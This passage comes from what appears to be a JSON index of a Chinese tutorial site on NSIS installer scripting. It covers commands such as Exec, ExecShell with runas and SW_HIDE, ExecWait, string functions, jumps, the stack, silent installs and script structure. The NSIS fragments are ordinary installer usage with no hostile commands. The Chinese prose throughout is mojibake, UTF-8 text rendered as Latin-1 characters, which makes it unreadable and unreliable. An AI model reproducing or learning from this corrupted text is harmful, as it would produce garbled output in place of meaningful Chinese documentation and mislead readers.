åŒºæ®µè¯»å– \"é¡¹\" çš„å€¼å¹¶æŠŠè¯¥å€¼è¾“å‡ºåˆ°ç”¨æˆ·å˜é‡ã€‚ å¦‚æœè¯¥é¡¹æœªæ‰¾åˆ°æ—¶ä¼šæ”¾ç½®ä¸€ä¸ªé”™è¯¯æ ‡è®°ä¸”è¯¥ç”¨æˆ·å˜é‡è¢«èµ‹ä¸ºç©ºå€¼ã€‚ ä¾‹, è¯»å–TimeZoneZh.iniæ–‡ä»¶ä¸­Field 1åŒºæ®µçš„Stateé¡¹, å°†å€¼è¾“å‡ºåˆ°$0: ReadINIStr $0 \"PLUGINSDIR\\TimeZoneZh.ini\" \"Field 1\" \"State\" è°ƒç”¨å¤–éƒ¨ç¨‹åº Exec ä½œç”¨: æ‰§è¡Œä¸€ä¸ªæŒ‡å®šçš„ç¨‹åºå¹¶ä¸”ç«‹å³ç»§ç»­å®‰è£…, å°±æ˜¯ç›´æ¥æ‰§è¡Œä¸€ä¸ªç¨‹åºã€‚ æ³¨è§£ æŒ‡å®šçš„æ–‡ä»¶å¿…é¡»å­˜åœ¨äºç›®æ ‡ç³»ç»Ÿä¸Š, è€Œä¸æ˜¯ç¼–è¯‘ç³»ç»Ÿä¸Š $OUTDIR è®¾ç½®å·¥ä½œç›®å½•. å¦‚æœæ— æ³•å¯åŠ¨è¿›ç¨‹ï¼Œåˆ™ä¼šè®¾ç½®é”™è¯¯æ ‡å¿— å¦‚æœå‘½ä»¤å¯ä»¥æœ‰ç©ºæ ¼, åˆ™åº”å°†å…¶æ”¾åœ¨å¼•å·ä¸­ä»¥ä»å‚æ•°ä¸­åˆ†éš”å®ƒ ä¾‹, å®‰è£…Microsoft.NET.exe, ç¨‹åºä¸ç­‰å¾…ç»§ç»­æ‰§è¡Œä¸‹ä¸ªæ­¥éª¤: Exec '$INSTDIR\\Microsoft.NET.exe' ExecShell å¯åŠ¨ ShellExecute æ‰§è¡Œ. è¯­æ³•: ExecShell action command [parameters] [SW_SHOWNORMAL | SW_SHOWMAXIMIZED | SW_SHOWMINIMIZED | SW_HIDE] actionæœ‰: open , æ­£å¸¸æ‰“å¼€, æ”¯æŒexeæ–‡ä»¶, batè„šæœ¬ç­‰èƒ½ç›´æ¥è¿è¡Œçš„æ–‡ä»¶ print runas , ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€æ–‡ä»¶(ä¼šå¼¹å‡ºä¸€ä¸ªç”³è¯·ææƒçš„å¼¹çª—) è‹¥ action ä¸ºç©ºè¡¨ç¤ºä½¿ç”¨é»˜è®¤åŠ¨ä½œ command è¡¨ç¤ºæ‰§è¡Œå‘½ä»¤, å†…å®¹ä¸º å¯æ‰§è¡Œæ–‡ä»¶å…¨è·¯å¾„ . parameters ä¸º command çš„å‚æ•°, å¯ä¸ºé‡å®šå‘ç¬¦å·å¦‚: 2>&1 > log.txt SW_HIDE éšè—æ‰§è¡Œå‘½ä»¤æ‰“å¼€çš„çª—å£ ExecWait æ‰§è¡Œä¸€ä¸ªæŒ‡å®šçš„ç¨‹åºå¹¶ä¸” ç­‰å¾…è¿è¡Œå¤„ç†ç»“æŸ è¯­æ³•: ExecWait command [user_var(exit code)] ä¾‹, é™é»˜å®‰è£…å¹¶ç­‰å¾…ç»“æŸ: ExecWait '\"$INSTDIR\\someprogram.exe /quiet /norestart\"' $0 è‹¥æ‰§è¡Œäº§ç”Ÿé”™è¯¯, å¯ä½¿ç”¨ IfErrors æ¥è¿›è¡Œåˆ¤æ–­, æ­¤æ—¶: è‹¥æŒ‡å®šäº† [user_var(exit code)] , åˆ™ ExecWait ä¼šæŠŠå˜é‡è®¾ä¸ºè¿”å›ä»£ç . å³ user_var = exit code è‹¥æœªæŒ‡å®š [user_var(exit code)] , åˆ™ ExecWait ä¼šæ”¾ç½®ä¸€ä¸ªé”™è¯¯æ ‡è®°. æ³¨è§£ è‹¥å‘½ä»¤å­˜åœ¨ç©ºæ ¼, ä½¿ç”¨å¼•å·åŒ…è£¹ ReserveFile ä½œç”¨: æŠŠæ–‡ä»¶ä¿å­˜åœ¨ç¨åä½¿ç”¨çš„æ•°æ®åŒºå—ç”¨äºä¸‹é¢çš„è°ƒç”¨ã€‚æœ‰æ—¶, é¢„å…ˆæ‰“åŒ…æ–‡ä»¶, æ–¹ä¾¿å®‰è£…åŠ é€Ÿé‡Šæ”¾ä¹‹ç”¨ã€‚ è¯­æ³•: ReserveFile [/nonfatal] [/r] [/x file|wildcard [...]] file [file...] ä¾‹: ReserveFile \"TimeZoneZh.ini\" RegDLL ä½œç”¨: è½½å…¥æŒ‡å®šçš„ DLL å¹¶ä¸”è°ƒç”¨ DllRegisterServer (æˆ–å…¥å£ç‚¹åç§°, å½“æŒ‡å®šä¹‹å). å½“äº§ç”Ÿä¸€ä¸ªé”™è¯¯çš„æ—¶å€™ä¼šç½®ä¸€ä¸ªé”™è¯¯æ ‡è®° (ä¾‹å¦‚ä¸èƒ½è½½å…¥ DLL, ä¸èƒ½åˆå§‹åŒ– OLE, ä¸èƒ½æ‰¾åˆ°å…¥å£ç‚¹, æˆ–è€…å‡½æ•°è¿”å›ä»»ä½•å…¶å®ƒé”™è¯¯ ERROR_SUCCESS (=0)). å…¶å®å°±æ˜¯æ³¨å†Œæˆ–åŠ è½½ä½ è¦çš„æ’ä»¶! ä¾‹: SetOutPath $INSTDIR RegDLL $INSTDIR\\foo.dll UnRegDLL ä½œç”¨: æ³¨é”€DLLæ’ä»¶ ä¾‹, æ³¨é”€TIMProxy.dllæ’ä»¶: UnRegDLL $INSTDIR\\foo.dll !include ä½œç”¨: åŒ…å«å¤´æ–‡ä»¶ ä¾‹, å¼•ç”¨\"MUI.nsh\"å¤´æ–‡ä»¶: !include \"MUI.nsh\" !insertmacro ä½œç”¨: æ’å…¥å® ä¾‹, é€šè¿‡å®æ’å…¥æ¬¢è¿é¡µé¢: !insertmacro MUI_PAGE_WELCOME å­—ç¬¦ä¸²æ“ä½œ StrCpy ä½œç”¨: å¤åˆ¶å­—ç¬¦ä¸² è¯­æ³•: StrCpy user_var(destination) str [maxlen] [start_offset] str å¯ä»¥åŒ…å«å…¶ä»–å˜é‡ maxlen è®¾ç½®æˆªå– str çš„é•¿åº¦, é»˜è®¤å…¨éƒ¨é•¿åº¦; ä¸ºè´Ÿæ•°è¡¨ç¤ºæˆªå–è‡³æ­¤ä½ç½®. maxlenä¸ºè´Ÿæ•°è¡¨ç¤ºæˆªå–è‡³æ­¤ä½ç½®, eg: StrCpy $1 \"D:\\Program Files\\test\\Example One\\uninstall.exe\" StrCpy $6 $1 -13 MessageBox MB_OK \"0 res $6\" ç»“æœå°±æ˜¯: D:\\Program Files\\test\\Example One\\ StrCmp ä½œç”¨: æ¯”è¾ƒ(ä¸åŒºåˆ†å¤§å°å†™)\"å­—ä¸²1\"å’Œ\"å­—ä¸²2\", å¦‚æœä¸¤è€…ç›¸ç­‰, è·³è½¬åˆ°\"ç›¸åŒæ—¶è·³è½¬çš„æ ‡è®°\", å¦åˆ™è·³è½¬åˆ°\"ä¸ç›¸åŒæ—¶è·³è½¬çš„æ ‡è®°\"ã€‚ è¯­æ³•: StrCmp str1 str2 jump_if_equal [jump_if_not_equal] StrLen ä½œç”¨ï¼šè·å–strçš„é•¿åº¦ ä¾‹å¦‚: StrLen $0 \"123456\" # $0 = 6 å…¶ä»–å­—ç¬¦ä¸²æ“ä½œ, éœ€è¦å…ˆå¯¼å…¥ WordFunc.nsh: !include WordFunc.nsh WordFind WordFind, åœ¨ç»™å®šå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä½¿ç”¨æŒ‡å®šçš„åˆ†éš”ç¬¦åˆ†éš”çš„å­—ç¬¦ä¸², å¦‚ä»å­—ç¬¦ä¸² \"first;second;third;forth\" ä¸­æŸ¥æ‰¾ç¬¬äºŒä¸ªå­—ç¬¦ä¸²: ${WordFind} \"first;second;third;forth\" \";\" +2 $R0 # $R0 = second WordFind2X WordFind2X, åœ¨ç»™å®šå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä½¿ç”¨æŒ‡å®šçš„ä¸¤ä¸ªåˆ†éš”ç¬¦åŒ…å›´çš„å­—ç¬¦ä¸², å¦‚ ä»å­—ç¬¦ä¸² <System>|<Guest>|<User> ä¸­æŸ¥æ‰¾ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯å€’æ•°ç¬¬ä¸€ä¸ªï¼Œå³User: ${WordFind2X} \"<System>|<Guest>|<User>\" \"<\" \">\" -1 $R0 WordFind3X WordFind3X, ä¸WordFind2Xæ¯”è¾ƒç›¸ä¼¼ï¼Œç”¨äºåœ¨ç»™å®šå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä½¿ç”¨æŒ‡å®šçš„ä¸¤ä¸ªåˆ†éš”ç¬¦åŒ…å›´ä¸”å«æœ‰æŒ‡å®šå­—ç¬¦ä¸²çš„å­—ç¬¦ä¸² è¯­æ³•: ${WordFind3X} \"[string]\" \"[delimiter1]\" \"[center]\" \"[delimiter2]\" \"[E][options]\" $var å¦‚æŸ¥æ‰¾ [/install=11], [/update=22], [/start=33] ä¸­ /update çš„æ•´ä¸ªå†…å®¹: ${WordFind3X} \"[/install=11], [/update=22], [/start=33]\" \"[\" \"/update\" \"]\" +1 $0 # $0 = \"/update=22\" è§: nsis:WordFind3X WordReplace WordReplace, ä»å­—ç¬¦ä¸²ä¸­æ›¿æ¢æˆ–åˆ é™¤è¯è¯­, è¯­æ³•: # ${WordReplace} \"[å­—ç¬¦ä¸²]\" \"[è¯è¯­1]\" \"[è¯è¯­2]\" \"[E][é€‰é¡¹]\" $è¾“å‡ºå˜é‡ ${WordReplace} \"[string]\" \"[word1]\" \"[word2]\" \"[E][options]\" $var é€‰é¡¹è¿™é‡Œçš„ç¬¬å‡ ä¸ªä¸‹æ ‡ä»1å¼€å§‹, ä¾‹: Section ${WordReplace} \"C:\\io.sys C:\\logo.sys C:\\WINDOWS\" \"SYS\" \"bmp\" \"+2\" $R0 ; $R0=\"C:\\io.sys C:\\logo.bmp C:\\WINDOWS\" SectionEnd è§: nsis:WordReplace WordAdd WordAdd, ä»é€‰é¡¹ä¸­æŒ‡å®šçš„ å­—ç¬¦ä¸²2 æ·»åŠ è¯è¯­åˆ° å­—ç¬¦ä¸²1(å¦‚æœä¸å­˜åœ¨)ï¼Œæˆ–åˆ é™¤è¯è¯­(å¦‚æœå­˜åœ¨)ã€‚è¯­æ³•: ${WordAdd} \"[å­—ç¬¦ä¸²1]\" \"[åˆ†éš”ç¬¦]\" \"[E][é€‰é¡¹]]\" $è¾“å‡ºå˜é‡ WordInsert WordInsert, åœ¨å­—ç¬¦ä¸²ä¸­æ’å…¥è¯è¯­ã€‚è¯­æ³•: ${WordInsert} \"[å­—ç¬¦ä¸²]\" \"[åˆ†éš”ç¬¦]\" \"[è¯è¯­]\" \"[E][é€‰é¡¹]]\" $è¾“å‡ºå˜é‡ StrFilter StrFilter, è½¬æ¢å­—ç¬¦ä¸²ä¸ºå¤§å†™æˆ–å°å†™ï¼›è®¾ç½®ç¬¦å·è¿‡æ»¤ã€‚è¯­æ³•: ${StrFilter} \"[å­—ç¬¦ä¸²]\" \"[é€‰é¡¹]\" \"[ç¬¦å·1]\" \"[ç¬¦å·2]\" $è¾“å‡ºå˜é‡ VersionCompare VersionCompare, ç”¨æ¥æ¯”è¾ƒç‰ˆæœ¬å·çš„å¤§å°ã€‚ä¾‹å¦‚ï¼Œæ¯”è¾ƒ1.1.0.1å’Œ1.1.1.0çš„å¤§å°ã€‚è¯­æ³•: ${VersionCompare} \"[ç‰ˆæœ¬1]\" \"[ç‰ˆæœ¬2]\" $è¾“å‡ºå˜é‡ VersionConvert VersionConvert, å°†å¸¦å­—æ¯çš„ç‰ˆæœ¬è½¬æ¢ä¸ºå¯ç”¨äºæ¯”è¾ƒçš„åè¿›åˆ¶æ•°ç‰ˆæœ¬å·ã€‚è¯­æ³•: ${VersionConvert} \"[ç‰ˆæœ¬]\" \"[å­—ç¬¦åˆ—è¡¨]\" $è¾“å‡ºå˜é‡ ç”¨æ³•ç¤ºä¾‹: ${VersionConvert} \"9.0c\" \"\" $R0 # $R0 = 9.0.03 .è¿™æ ·è½¬æ¢åå¯ä»¥ç”¨äºå’Œåˆ«çš„ç‰ˆæœ¬å¦‚9.0aæ¯”è¾ƒã€‚ æ•°å­¦è®¡ç®— IntOp 10å‡å»2, eg: IntOp $0 10 - 2 æ•ˆæœæ˜¯è®¡ç®— 10-2 , å°†ç»“æœ8èµ‹å€¼ç»™ $0 . æ–‡ä»¶ç›®å½•éå† FindFirst/FindNext/FindClose è¿™ä¸‰ä¸ªä¸€èˆ¬ä¸€èµ·ä½¿ç”¨ FindFirstè¯­æ³•: FindFirst user_var(handle output) user_var(filename output) filespec ç¬¬ä¸€ä¸ª handle output æ˜¯æœç´¢çš„æ–‡ä»¶å¥æŸ„ ç¬¬äºŒä¸ª filename output æ˜¯æ‰¾åˆ°çš„æ–‡ä»¶å(ä¸åŒ…å«å‰ç¼€ç›®å½•) filespec æ˜¯æœç´¢çš„è·¯å¾„æè¿°, æ”¯æŒç®€å•é€šé…ç¬¦ eg: FindFirst $0 $1 $INSTDIR\\*.txt loop: StrCmp $1 \"\" done DetailPrint $1 FindNext $0 $1 Goto loop done: FindClose $0 é€»è¾‘æ“ä½œ IfAbort å¦‚æœè°ƒç”¨abortï¼Œå®ƒå°†\"è¿”å›\"ä¸ºtrueã€‚ è¯­æ³•: IfAbort label_to_goto_if_abort [label_to_goto_if_no_abort] å¦‚æœç”¨æˆ·é€‰æ‹©å¯¹æ— æ³•åˆ›å»ºï¼ˆæˆ–è¦†ç›–ï¼‰çš„æ–‡ä»¶è¿›è¡Œä¸­æ­¢ï¼Œæˆ–è€…ç”¨æˆ·æ‰‹åŠ¨ä¸­æ­¢ï¼Œåˆ™ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚åªèƒ½ä»instfiles é¡µé¢çš„leaveå‡½æ•°è°ƒç”¨æ­¤å‡½æ•°: Function instfilesLeave IfAbort 0 +2 MessageBox MB_OK \"user aborted\" FunctionEnd IfErrors é”™è¯¯æ—¶è·³è½¬ è¯­æ³•: jumpto_iferror [jumpto_ifnoerror] æ£€æµ‹å¹¶æ¸…é™¤é”™è¯¯æ ‡è®°, å¦‚æœè®¾äº†é”™è¯¯æ ‡è®°, åˆ™è·³è½¬åˆ°\"é”™è¯¯æ—¶è·³è½¬çš„æ ‡è®°\", å¦åˆ™è·³è½¬åˆ°\"æ²¡æœ‰é”™è¯¯æ—¶è·³è½¬çš„æ ‡è®°\"ã€‚ å¯ä½¿ç”¨ ClearErrors åœ¨ä¹‹å‰æ¸…é™¤å…¶ä»–åœ°æ–¹çš„é”™è¯¯æ ‡è®° IfFileExists è¯­æ³•: IfFileExists file_to_check_for jump_if_present [jump_otherwise] æ£€æµ‹ file_to_check_for æ˜¯å¦å­˜åœ¨(å¯ä»¥ç”¨é€šé…ç¬¦, æˆ–ç›®å½•) å½“æ–‡ä»¶å­˜åœ¨æ—¶è·³è½¬åˆ° file_to_check_for å¦åˆ™è·³è½¬åˆ° jump_otherwise . ä¾‹1, å®˜ç½‘ä¾‹å­: IfFileExists $WINDIR\\notepad.exe 0 +2 MessageBox MB_OK \"notepad is installed\" ä¾‹2: IfFileExists $WINDIR\\notepad.exe fileExists fileNotExists fileExists: # do something Goto done fileNotExists: Abort done: Goto ä½œç”¨: è·³è½¬åˆ°æŒ‡å®šæ ‡è®°ã€‚ nsiè„šæœ¬å¸¸å¸¸ä½¿ç”¨ç›¸å¯¹è·³è½¬è¡¨ç¤ºæ¡ä»¶åˆ†æ è¯­æ³•: Goto label_to_jump_to | +offset| -offset| user_var(target) +offset è¡¨ç¤ºä»å½“å‰ä½ç½®å¾€å‰è·³è½¬ offset æ¡è¯­å¥, -offset è¡¨ç¤ºä»å½“å‰ä½ç½®å¾€åè·³è½¬ offset æ¡è¯­å¥. user_var è¡¨ç¤ºè·³è½¬åˆ°æŒ‡å®šå˜é‡æ ‡è®°ä½ç½®. ä¾‹, æŒ‰æ•°å­—è·³è½¬: Goto +4 ; è·³è½¬ä»¥ä¸‹4æ¡è¯­å¥ Goto -3 ; è·³è½¬åˆ°å‰3æ¡è¯­å¥ ä¾‹, æŒ‰æ ‡è®°è·³è½¬: goto_example ClearErrors å½“ç¨‹åºè¿è¡Œäº§ç”Ÿé”™è¯¯æ—¶, å¯ä»¥ä½¿ç”¨ NSIS_IfErrors åˆ¤æ–­, è¿”å› true/false , è¡¨ç¤ºå­˜åœ¨é”™è¯¯. ClearErrors å¯ä»¥æ¸…é™¤å½“å‰å·²æœ‰çš„é”™è¯¯æ ‡è®° å †æ ˆæ“ä½œ å…¶å® ä¹Ÿå±äºé€»è¾‘æ“ä½œ NSIS è„šæœ¬æ²¡æœ‰ reture è¿™ç§è¿”å›å€¼, åªèƒ½ä½¿ç”¨ æ ˆ çš„æ–¹å¼åœ¨å‡½æ•°ä¹‹å‰ä¼ é€’å‚æ•°(æˆ–è€…å…¨å±€å˜é‡) Pop Push Exch Pop ä»æ ˆé¡¶å–å‡ºä¸€ä¸ªå‚æ•°. å¦‚å°†æ ˆé¡¶å…ƒç´ å–å‡º, èµ‹å€¼ç»™ $0 Pop $0 Push å‘æ ˆç§å‹å…¥å‚æ•°. å¦‚å‹å…¥ \"change\" Push \"change\" Exch è¯­æ³•: Exch [user_var|stack_index] é»˜è®¤äº¤æ¢æ ˆé¡¶çš„ä¸¤ä¸ªå…ƒç´ , å¦‚: Push 1 Push 2 Exch Pop $0 # = 1 è‹¥æŒ‡å®šäº† [user_var|stack_index] : è‹¥æŒ‡å®šäº†ç”¨æˆ·å˜é‡, ä½¿ç”¨ç”¨æˆ·å˜é‡ä¸æ ˆé¡¶å…ƒç´ äº¤æ¢ å¦‚: Push 2 Exch $0 # = 2 è‹¥æŒ‡å®šäº†æ•´å‹(int), å³æ ˆçš„ç´¢å¼•, ä½¿ç”¨ç´¢å¼•ä½ç½®çš„å…ƒç´ ä¸æ ˆé¡¶å…ƒç´ äº¤æ¢ æ³¨æ„, ç´¢å¼•ä»0å¼€å§‹, æ ˆé¡¶ç´¢å¼•ä¸º0 å¦‚: Push 1 Push 2 Push 3 Exch 2 Pop $0 # = 1 å¦‚æœéœ€è¦äº¤æ¢çš„å…ƒç´ ä¸ªæ•°ä¸è¶³, å¦‚ç´¢å¼•è¶Šç•Œç­‰, æŠ¥é”™ è·å–å‘½ä»¤è¡Œå‚æ•° å®˜ç½‘åœ°å€: GetOptions GetParameters GetOptions GetParameters è¯­æ³•: ${GetParameters} $var ä¾‹: ${GetParameters} $R0 ; $R0=\"[parameters]\" GetOptions è¯­æ³•: ${GetOptions} \"[Parameters]\" \"[Option]\" $var \"[Parameters]\" ; command line parameters ; \"[Option]\" ; option name ; $var ; Result: option string ä¾‹: !include \"FileFunc.nsh\" !insertmacro GetOptions !insertmacro GetParameters Section ${GetOptions} \"-INSTDIR=C:\\Program Files\\Common Files -SILENT=yes\" \"-INSTDIR=\" $R0 ;$R0=C:\\Program Files\\Common Files SectionEnd ä¸èƒ½å†™åˆ°ä¸€èµ·, æ¯”å¦‚ä»¥ä¸‹è¿™æ¡è¯­å¥æ˜¯é”™è¯¯çš„: ${GetOptions} ${GetParameters} \"-INSTDIR=\" $R0 ä¾‹2, å‘½ä»¤è¡Œä¸º: foo.exe /S /USERNAME=Bar /D=C:\\Program Files\\Foo è„šæœ¬å†…å®¹ä¸º: !include FileFunc.nsh !insertmacro GetParameters !insertmacro GetOptions Function .onInit ${GetParameters} $R0 ClearErrors ${GetOptions} $R0 /USERNAME= $0 FunctionEnd æ•ˆæœ: å°† /USERNAME= åçš„å€¼èµ‹å€¼ç»™ $0 , è¿™æ ·å°±æ”¯æŒäº†è‡ªå®šä¹‰å‘½ä»¤è¡Œå‚æ•°. å…³äº /S (é™é»˜å®‰è£…å‚æ•°)çš„åˆ¤æ–­ é™é»˜å®‰è£…ç³»ç»Ÿæœ‰æä¾›é»˜è®¤çš„åˆ¤æ–­, ä¸éœ€è¦æ‰‹åŠ¨å»è·å–å‘½ä»¤è¡Œäº†: Function .onInit IfSilent jumpToSlient jumpNotSilent jumpToSlient: ; é™é»˜å®‰è£…çš„æ“ä½œ Goto done jumpNotSilent: ; éé™é»˜å®‰è£…æ“ä½œ Goto done done: FunctionEnd ä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰å…¨å±€å˜é‡å§ é™é»˜å®‰è£…å®ç° /S å‚æ•° æ‰§è¡Œçš„æ—¶å€™ä½¿ç”¨, å¦‚ xxx.exe /S SetSilent SilentInstall and SilentUninstall SetSilent è„šæœ¬é‡Œè®¾ç½®: SetSilent silent | normal åªèƒ½åœ¨ .onInit. è¢«ä½¿ç”¨ SilentInstall ç”¨æ³•: SilentInstall normal|silent|silentlog SilentUninstall ç”¨æ³•: SilentUnInstall normal|silent åˆ¤æ–­æ˜¯å¦æ˜¯é™é»˜å®‰è£… ä½¿ç”¨ IfSilent IfSilent +2 ExecWait '\"$INSTDIR\\nonsilentprogram.exe\"' è¿™é‡Œæ²¡æ‡‚ +2 æ˜¯ä»€ä¹ˆæ„æ€","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-NSIS-instruction.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-NSIS-instruction.html"},{"title":"è„šæœ¬ç»“æ„","text":"å±æ€§å®šä¹‰: NSIS_å˜é‡ åŒ…çš„å¯¼å…¥: NSIS_å¯¼å…¥å…¶ä»–è„šæœ¬ é¡µé¢é…ç½®: å‘å¯¼é¡µ åŒºæ®µ å‡½æ•°: å›è°ƒå‡½æ•° ; è‡ªå®šä¹‰å‡½æ•° å‘å¯¼é¡µ å‘å¯¼é¡µ(Page) å¤å…¸é¡µé¢ è¯­æ³•: Page [Custom] <name|function> å¦‚æœä½¿ç”¨ Custom åé¢è·Ÿè‡ªå®šä¹‰å‡½æ•°, è¡¨ç¤ºè‡ªå®šä¹‰çš„å‘å¯¼é¡µé¢, ä¸€ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªé¡µé¢, å¯ç›´æ¥æ ¹å¤šä¸ª. éé™é»˜å®‰è£…, å®‰è£…å‘å¯¼é¡µé¢è®¾ç½®(è®¾ç½®æ˜¾ç¤ºå“ªäº›ç•Œé¢): Page license Page components Page directory Page instfiles UninstPage uninstConfirm UninstPage instfiles ç°ä»£é¡µé¢(å®å®šä¹‰) ä¾‹å¦‚: ; æ¬¢è¿é¡µé¢ !insertmacro MUI_PAGE_WELCOME ; è®¸å¯åè®®é¡µé¢ !insertmacro MUI_PAGE_LICENSE \"LicenceDeclare.txt\" ; å®‰è£…ç›®å½•é€‰æ‹©é¡µé¢ !insertmacro MUI_PAGE_DIRECTORY ; å®‰è£…è¿‡ç¨‹é¡µé¢ !insertmacro MUI_PAGE_INSTFILES ; å®‰è£…å®Œæˆé¡µé¢ !insertmacro MUI_PAGE_FINISH ; å®‰è£…å¸è½½è¿‡ç¨‹é¡µé¢ !insertmacro MUI_UNPAGE_INSTFILES ; å®‰è£…ç•Œé¢åŒ…å«çš„è¯­è¨€è®¾ç½® !insertmacro MUI_LANGUAGE \"SimpChinese\" ; å®‰è£…é¢„é‡Šæ”¾æ–‡ä»¶ !insertmacro MUI_RESERVEFILE_INSTALLOPTIONS ; ------ MUI ç°ä»£ç•Œé¢å®šä¹‰ç»“æŸ ------ è¿˜å¯ä»¥ä½¿ç”¨: !insertmacro # å’Œ !define å‘½ä»¤è¿›è¡Œæ›´å¤šå®‰è£…é¡µé¢å’Œå®‰è£…åŠŸèƒ½çš„è®¾ç½®. å¦‚å®‰è£…æ—¶å¯¹å¼€å§‹èœå•ã€æ¡Œé¢å¿«æ·å¯åŠ¨å›¾æ ‡çš„è®¾ç½®ç­‰. ç»„ä»¶(è‡ªå®šä¹‰èŠ‚/åŒºæ®µ) å¯¹åº”æŸç§å®‰è£…/å¸è½½é€‰é¡¹çš„å¤„ç†é€»è¾‘, è¯¥æ®µä»£ç ä»…å½“ç”¨æˆ·é€‰æ‹©ç›¸åº”çš„é€‰é¡¹æ‰è¢«æ‰§è¡Œ. å¸è½½ç¨‹åºçš„åŒºæ®µåç”¨\"un.\"ä½œä¸ºå‰ç¼€. æœ‰äº›åº”ç”¨ç¨‹åºå…è®¸å®‰è£…é¢å¤–çš„ç»„ä»¶, æ¯”å¦‚å®‰è£…çš„æ—¶å€™, æ˜¾ç¤ºå¯é€‰çš„ç»„ä»¶, è®©ç”¨æˆ·é€‰æ‹©å“ªäº›ç»„ä»¶å¯ä»¥å®‰è£…. ä½¿ç”¨ Section Section \"Installer Section\" SectionEnd å¸è½½çš„æ—¶å€™ä¹Ÿæ”¯æŒå¯é€‰å¸è½½, åœ¨åç§°å‰åŠ  un å³å¯: Section \"un.Uninstaller Section\" SectionEnd æ³¨è§£ Section æ”¯æŒè®¾ç½®å¤šä¸ª, è¡¨ç¤ºå¤šä¸ªç»„ä»¶éƒ¨åˆ†å¯é€‰ åŒºæ®µåçš„ä¿®é¥°ç¬¦: /o è¡¨ç¤ºè¯¥åŒºæ®µé»˜è®¤ä¸é€‰ä¸Š - è¡¨ç¤ºéšè—åŒºæ®µ(åŒ¿ååŒºæ®µä¹Ÿæ˜¯éšè—åŒºæ®µ) ! è¡¨ç¤ºéœ€è¦ç²—ä½“æ˜¾ç¤ºçš„åŒºæ®µã€‚ å¦å¤–è¿˜æœ‰: SectionIn è¡¨ç¤ºè¯¥åŒºæ®µå’Œå®‰è£…ç±»å‹ä¹‹é—´çš„å…³ç³» è¯­æ³•: SectionIn insttype_index [insttype_index] ... [RO] ; RO ä¿®é¥°ç¬¦è¡¨ç¤ºä¸å¯ä¿®æ”¹ã€‚ SubSectionè¡¨ç¤ºå­åŒºæ®µ è¯­æ³•: SubSection [/e] Caption [subsection_name index output] ;ä¿®é¥°ç¬¦ /e ç”¨äºè¯¥å­åŒºæ®µçš„æ‰€æœ‰åŒºæ®µæ˜¯å¦é»˜è®¤å±•å¼€ã€‚ è‡ªå®šä¹‰å‡½æ•° è¯­æ³•: Function fun_name # do something FunctionEnd è°ƒç”¨: Call fun_name é¢„å®šä¹‰å‡½æ•°-å›è°ƒå‡½æ•° å®‰è£…é€»è¾‘çš„å›è°ƒå‡½æ•°: .onGUIInit .onInit .onInstFailed .onInstSuccess .onGUIEnd .onMouseOverSection .onRebootFailed .onSelChange .onUserAbort .onVerifyInstDir å¸è½½é€»è¾‘å›è°ƒå‡½æ•°: un.onGUIInit un.onInit un.onUninstFailed un.onUninstSuccess un.onGUIEnd un.onRebootFailed un.onUserAbort å…¶ä»–-å†…ç½®å­—æ®µ éƒ¨åˆ†å­—æ®µ VIProductVersion \"$version\" : å®šä¹‰é¼ æ ‡æ”¾ä¸Šå»æ—¶, æ˜¾ç¤ºçš„ç‰ˆæœ¬ä¿¡æ¯ VIAddVersionKey /LANG=${language} \"CompanyName\" \"xxxå…¬å¸\" : é¼ æ ‡æ”¾ä¸Šå»æ—¶, æ˜¾ç¤ºçš„å…¬å¸åç§°","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Script-structure.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Script-structure.html"},{"title":"ä¸€äº›å¸¸è§é”™è¯¯","text":"Bad text encoding ç”¨ç¼–è¾‘å™¨å°†ç¼–ç ä» UTF-8 è½¬æ¢ä¸º GB2312","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-common-errors.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-common-errors.html"},{"title":"ä¸€äº›ä½¿ç”¨é—®é¢˜/æŠ€å·§","text":"æ‰§è¡Œ bat ä¸æ‰“å¼€ dosçª—å£ è¿™ä¸ªç©æ„å„¿å°±æ˜¯ä¸€ä¸ªå‘, æ‰¾äº†å‡ ä¹ä¸€å¤©çš„è§£å†³æ–¹æ¡ˆ. ä»€ä¹ˆ start å¯åŠ¨ç­‰ è¿™é‡Œè¡¥å……ä¸€ä¸ªå°æŠ€å·§å§, å½“åœ¨nsisè„šæœ¬ä¸­æ‰§è¡Œ bat æŒ‡ä»¤æ—¶, æ€»æ˜¯ä¼šæ‰“å¼€ dos é»‘çª—å£, ä¸æƒ³è¦å®ƒæ˜¾ç¤º, å¯ä»¥ä½¿ç”¨: ExecShell 'open' '$INSTDIR\\t.bat' \"1 1 >$INSTDIR/log.txt 2>&1\" SW_HIDE æ‰¾äº†å¾ˆä¹…çš„è§£å†³æ–¹æ¡ˆ, ç½‘ä¸Šä»€ä¹ˆstartå•¥çš„éƒ½æ— æ³•æ‰§è¡Œ, æœ€åç»ˆäºå®éªŒå‡ºäº†è¿™ä¸ª, ä¸€å¼€å§‹ä¸çŸ¥é“ open ä¹Ÿæ”¯æŒæ‰“å¼€ bat, è¸äº†å¾ˆä¹…çš„å‘. SW_HIDE è¡¨ç¤ºéšè—dosçª—å£. è¯¦æƒ…è§: NSIS_ExecShell å®‰è£…æ—¥å¿—è®¾ç½® å¦‚ä¸‹: !include \"LogicLib.nsh\" ; æœ¬åŒºæ®µå¿…é¡»æ”¾ç½®åœ¨æ‰€æœ‰åŒºæ®µä¹‹å‰ ; è¿è¡Œåä¼šåœ¨å®‰è£…ç›®å½•ç”Ÿæˆä¸€ä¸ªinstall.logæ–‡ä»¶ Section 